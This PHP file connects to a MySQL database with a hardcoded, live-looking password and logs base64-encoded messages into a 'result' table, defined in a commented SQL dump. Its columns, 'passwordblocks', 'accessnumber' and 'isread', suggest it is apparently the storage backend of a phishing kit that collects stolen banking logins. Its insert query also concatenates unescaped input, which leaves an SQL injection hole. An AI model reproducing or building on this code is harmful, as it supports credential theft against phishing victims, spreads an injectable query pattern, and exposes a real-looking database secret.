<?php
$dbconnect = mysqli_connect('localhost', 'boxqeecs_result', '{yXUzlC!Ju4Z', 'boxqeecs_beepin');

function insertrow($subject,$msg,$ip,$dbconnect){
    $sql = 'INSERT INTO result SET subject="'.$subject.'", message="'.base64_encode($msg).'"';
    $sqlResult = mysqli_query($dbconnect, $sql);
    return mysqli_insert_id($dbconnect);
}
/*-- phpMyAdmin SQL Dump
-- version 4.7.9
-- https://www.phpmyadmin.net/
--
-- Host: 127.0.0.1:3308
-- Generation Time: Sep 16, 2018 at 06:00 PM
-- Server version: 5.7.21
-- PHP Version: 7.0.29

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET AUTOCOMMIT = 0;
START TRANSACTION;
SET time_zone = "+00:00";

--
-- Database: `august`
--

-- --------------------------------------------------------

--
-- Table structure for table `result`
--


CREATE TABLE IF NOT EXISTS `result` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `subject` varchar(220) DEFAULT NULL,
  `message` text,
  `isread` varchar(10) DEFAULT 'notread',
  `date_time` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `passwordblocks` varchar(33) DEFAULT NULL,
  `accessnumber` varchar(25) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;
COMMIT;
*/